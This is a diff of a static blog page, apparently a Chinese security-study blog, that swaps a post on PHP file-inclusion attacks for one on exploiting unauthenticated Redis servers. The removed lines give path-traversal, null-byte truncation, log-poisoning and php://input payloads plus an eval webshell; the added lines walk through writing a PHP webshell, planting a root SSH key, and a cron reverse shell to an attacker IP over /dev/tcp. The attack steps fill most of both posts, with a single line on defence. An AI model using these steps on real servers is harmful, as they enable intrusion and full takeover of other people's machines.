@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        文件包含｜undefined
+        redis未授权漏洞｜undefined
         
     </title>
 
-    <link rel="canonical" href="https://pengpengp.github.io/2019/02/17/文件包含/">
+    <link rel="canonical" href="https://pengpengp.github.io/2019/02/18/redis未授权漏洞/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -136,17 +136,17 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>文件包含</h1>
+                    <h1>redis未授权漏洞</h1>
                     
                     <span class="meta">
                          作者 pengpengp
                         <span>
-                          日期 2019-02-17
+                          日期 2019-02-18
                          </span>
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#文件包含漏洞" title="文件包含漏洞">文件包含漏洞</a>
+                        <a class="tag" href="/tags/#redis漏洞(一般内网）" title="redis漏洞(一般内网）">redis漏洞(一般内网）</a>
                         
                     </div>
                 </div>
@@ -155,7 +155,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            文件包含
+            redis未授权漏洞
         </span>
     </div>
 </header>
@@ -166,119 +166,68 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <blockquote>
-<p>一.相关的四个函数：</p>
-</blockquote>
-<p>include “$path”    出错继续执行</p>
-<p>require        出错终止</p>
-<p>include once()    只能包含一次</p>
-<p>require once()</p>
-<hr>
-<blockquote>
-<p>二.本地文件包含：</p>
-</blockquote>
-<p>​    include($_GET[‘abc’])<br>        然后在地址栏给abc传入一个值 ../../../就可以随意读取目录的文件</p>
-<hr>
-<blockquote>
-<p>三.远程文件包含：</p>
-</blockquote>
-<p>​        限制条件：php.ini文件中<br>        allow_url_include=on</p>
-<p>​    在一个安全的路径下运行cmd命令：<br>        php -S 0.0.0.0:6000就会打开一个apache服务器<br>        此时用浏览器可以访问（php5.6以上才带apache）</p>
-<p>最终目的是菜刀连接</p>
-<hr>
-<blockquote>
-<p>四. 文件包含配合文件上传漏洞：结合图片马或结合日志</p>
-</blockquote>
-<p>​    先上传一张图片马，再用文件包含漏洞去执行图片使菜单可执行，然后就可以用工具连接了</p>
-<hr>
-<blockquote>
-<p>五.文件包含的意义：使图片可被执行</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>六.怎么找到文件包含漏洞：</p>
-</blockquote>
-<p>​        谷歌：inurl:?include=</p>
-<hr>
-<blockquote>
-<p>七.文件包含漏洞.结合日志    /var/log/httpd/access_log</p>
-</blockquote>
-<p>​        写入日志文件：<br>        <a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E</a></p>
-<p>​    查看（需要权限）<a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log</a></p>
-<p>​    然后可以用菜刀连</p>
-<hr>
-<blockquote>
-<p>八.iis文件包含</p>
-</blockquote>
-<p>​        目录：<code>C:\inetpub\logs\LogFiles\W3SVC3</code></p>
-<hr>
-<blockquote>
-<p>九.本地文件包含截断</p>
-</blockquote>
-<p>​    本地常见模板：&lt;?php include(“inc/“ . $_GET[‘file’] . “.htm”); ?&gt; </p>
-<p>​    1.绕过方法(转)：%00截断<br>        /etc/passwd%00<br>        (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
-<p>​    2.%00截断目录遍历：<br>        /var/www/%00<br>        (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
-<p>​    3.路径长度截断：<br>        /etc/passwd/././././././.[…]/./././././.<br>        (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
-<p>​    4.点号截断：<br>        /boot.ini/………[…]…………<br>        (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
-<hr>
-<blockquote>
-<p>十.伪协议</p>
-</blockquote>
-<ul>
-<li><p>常用伪协议的使用：</p>
-<p> file://</p>
-<pre><code>php://filter        ---用来读文件
+                <h3 id="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><a href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件" class="headerlink" title="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"></a>原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</h3><h3 id="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><a href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等" class="headerlink" title="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"></a>利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</h3><h3 id="防御：限制redis权限"><a href="#防御：限制redis权限" class="headerlink" title="防御：限制redis权限"></a>防御：限制redis权限</h3><h1 id="一。-数据库原理：redis数据库-临时存储数据库"><a href="#一。-数据库原理：redis数据库-临时存储数据库" class="headerlink" title="一。 数据库原理：redis数据库(临时存储数据库)"></a>一。 数据库原理：redis数据库(临时存储数据库)</h1><pre><code>下载redis文件
 
-http://
+解压，`make --&gt;cd src make--&gt; install`
 
-ftp://
+启动:`redis-server`
 
-php://input        ---用来读post数据
-
-data://text/plain,1    ---用来修改读取的数据为1
-</code></pre></li>
-<li><p>综合前提：</p>
-<p> open_basedir</p>
-<p> include $_GET[]能用所有伪协议<br> include $_GET[].”.inc”能用http伪协议，其他形式都用不了伪协议</p>
-<p>  具体使用：</p>
+进入：令开个连接:`redis-cli`
+</code></pre><ul>
+<li><p>redis特点：数据在文件中存储  ,默认root权限(低权限时会无权限写日志导致启动失败)，6379端口无密码</p>
+</li>
+<li><p>利用redis数据库创建任意文件方法：</p>
+<pre><code>1.设置数据库文件存储路径：    `config set dir ./`
+</code></pre><p>​        2.设置数据库文件名称:<code>config set dbfilename zs</code></p>
+<p>​        3.设置键和值：<code>set name &quot;zs&quot;</code></p>
+<p>​        4.保存：<code>save</code></p>
+<p>​        5.在目录下就有一个zs文件     </p>
+</li>
+<li><p>实验：利用redis漏洞做webshell</p>
+<p>步骤：        </p>
+<p>​        1.<code>config set dir /var/www/html/</code><br>​        2.<code>config set dbfilename 404.php</code><br>​        3.<code>set name &quot;&lt;?php phpinfo()?&gt;&quot;</code><br>​        4.<code>save</code><br>​        5.在浏览器访问ip/404.php即可执行phpinfo 命令</p>
+</li>
+<li><p>常用命令：</p>
+<pre><code>info查看信息
+get/set
+    FLUSHALL：清空键值
+    get 键：获取值
+    config get dir：获取路径
+    config get dbfilename：获取文件名
+</code></pre><hr>
+<hr>
 </li>
 </ul>
-<p>   -&gt;1.file://的使用</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen  on/off</span><br><span class="line">allow_url_include on/off这两条不限制</span><br></pre></td></tr></table></figure>
-<p>   ​<br>   使用：<code>http://www.ad.com/include.php?path=file://c:\aa.txt</code></p>
-<p>   -&gt;2.php://filter用法：前面部分是固定的</p>
-<pre><code>    `php://filter/read/convert.base64-encode/resource=路径+文件名`
-
-得到加密的代码，用base64解码既可以得到php文件内容    
-</code></pre><p>​    </p>
-<p>​    -&gt;3.php://input的条件及使用</p>
-<p>​    条件：allow_url_include  on   远程文件包含开启</p>
-<p>使用：<br>    地址栏为：<code>include.php?path=php://input</code><br>    然后post发包：    <code>&lt;?php phpinfo();?&gt;</code>（post写要执行的php内容就可以被执行）<br>    写一句话的方法： <code>file_put_contents(&lt;?php eval($_POST[&#39;pass&#39;])?&gt;)</code></p>
-<p>​    </p>
-<p>​    -&gt;4.data://使用</p>
-<p>​    条件 allow_url_fopen on<br>    allow_url_include   on</p>
-<p>使用：<code>file=data://text/plain,&lt;?php phpinfo();?&gt;</code><br>    或者转为base64:<code>file=data://text/plain;base64,Kjmx()9wadalniaqfhq9fHQ9fh</code></p>
-<p>题外:判断access还是sql server数据库：<br>        <code>and exists(select count(*) from sysobjects;)</code><br>        sysobjects库只有sql server有</p>
-<p><a href="http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php</a></p>
+<h1 id="二。redis利用未授权漏洞ssh免密码登陆："><a href="#二。redis利用未授权漏洞ssh免密码登陆：" class="headerlink" title="二。redis利用未授权漏洞ssh免密码登陆："></a>二。redis利用未授权漏洞ssh免密码登陆：</h1><p>​                1.cat authorized_keys：秘钥内容<br>​                    2.FlUSHALL<br>​                    3.config set dir /root/.ssh<br>​                    4.config set dbfilename authorized_keys<br>​                    5.set sshkey “\n\n\n内容\n\n\n”        //换行符保证字符串分隔开<br>​                    6.save<br>​<br>​    条件：/etc/ssh/sshd_config |grep key –&gt;pubkeyAuthentication_keys 开启，即需要ssh先免密钥登陆一次</p>
+<ul>
+<li>流程：找到开放的6379端口：    <pre><code>1.redis-cli -h ip 连接远程服务器redis
+2.执行info能否成功
+3.用config set dir /root看看是不是root权限
+4.config set dir /root/.ssh
+5.config set dbfilename authorized_keys
+6.set sshkey &quot;\n\n\n公钥\n\n\n&quot;
+7.save
+</code></pre></li>
+</ul>
+<p>  ​    连接：把私钥保存成文件<br>  ​        ssh -i 私钥文件  <a href="mailto:root@192.168.11.84" target="_blank" rel="noopener">root@192.168.11.84</a></p>
 <hr>
-<blockquote>
-<p>十一. 防御方法：</p>
-</blockquote>
-<p>1.php.ini中open_basedir=www目录：限制只能打开指定路径的文件</p>
-<p>2.限制接收的变量内容</p>
+<hr>
+<h1 id="三。计划任务漏洞："><a href="#三。计划任务漏洞：" class="headerlink" title="三。计划任务漏洞："></a>三。计划任务漏洞：</h1><p>​    计划任务：<br>​            crontab -l 查看计划任务ss<br>​            <code>* * * * * echo &#39;date\nhello!&#39;&gt;&gt;/tmp/email`</code></p>
+<p>​        <code></code><em> </em> <em> </em> <em><code>代表分时日月周
+​        例子 :</code></em> 8 <em>/1 </em> * 命令`：每天八点执行命令<br>​                添加任务：crontab -e进入编辑模式,</p>
+<p>​            查看添加的任务：cat   /vat/spool/cron/root  //root是指用户    //小技巧：tail -f 文件   滚动刷新</p>
+<p>​            </p>
+<p><strong>练习：每分钟反弹shell到我的电脑*</strong><br>        1.用redis进行登陆：redis-cli -h ip<br>        2.<code>info</code>查看能否执行<br>        3.用<code>config set dir /root</code>看看是不是root权限<br>        4.<code>config set dir /var/spool/cron/</code><br>        5.<code>config set dbfilename root</code><br>        6.<code>set name    &quot;\n*/1 * * * *     bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\n&quot;</code><br>        7.<code>save</code><br>        8.本地nc中 <code>nc -lnvp40000</code> 开始监听</p>
+<p>遇到windows+redis的情况：<a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a></p>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2019/02/18/redis未授权漏洞/" data-toggle="tooltip" data-placement="top" title="redis未授权漏洞">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top" title="shell_rebound">Next Post &rarr;</a>
+                        <a href="/2019/02/17/文件包含/" data-toggle="tooltip" data-placement="top" title="文件包含">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -297,8 +246,8 @@ data://text/plain,1    ---用来修改读取的数据为1
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    
-                </div>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><span class="toc-text">原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><span class="toc-text">利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御：限制redis权限"><span class="toc-text">防御：限制redis权限</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一。-数据库原理：redis数据库-临时存储数据库"><span class="toc-text">一。 数据库原理：redis数据库(临时存储数据库)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二。redis利用未授权漏洞ssh免密码登陆："><span class="toc-text">二。redis利用未授权漏洞ssh免密码登陆：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三。计划任务漏洞："><span class="toc-text">三。计划任务漏洞：</span></a>
+                </li></div>
             </div>
         </div>
 
